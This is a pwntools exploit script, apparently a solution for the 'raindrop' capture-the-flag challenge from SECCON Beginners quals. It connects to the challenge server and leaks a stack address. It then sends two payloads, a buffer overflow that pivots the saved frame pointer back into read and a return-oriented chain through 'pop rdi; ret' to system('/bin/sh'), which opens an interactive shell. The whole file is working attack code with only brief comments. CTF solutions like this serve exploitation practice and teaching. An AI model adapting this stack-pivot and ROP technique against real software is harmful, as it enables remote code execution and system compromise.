#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("raindrop.quals.beginners.seccon.jp", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+112
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# Get stack address
p.recvuntil("000002 | ")
## 1st payload start address
payload_addr = eval(p.recv(18)) - 0x20
log.info("payload@stack: " + hex(payload_addr))
## 2nd payload start address
payload_2nd_addr = payload_addr + 0x18
log.info("payload2@stack: " + hex(payload_2nd_addr))

# 1st payload (recall read@vuln)
payload = b'/bin/sh\0'
payload += b'A' * 8
payload += p64(payload_2nd_addr + 0x10)# saved rbp
payload += p64(0x401246)# vuln+64
## read(0, [rbp - 0x10], 0x30)

payload2 = p64(0x401453)# pop rdi; ret
payload2 += p64(payload_addr)
payload2 += p64(0x40101a)# ret (for movaps)
payload2 += p64(elf.plt['system'])

log.info("payload len: " + hex(len(payload)))
p.recvuntil("Did you understand?")
p.sendline(payload)
sleep(1)
p.sendline(payload2)

p.interactive()
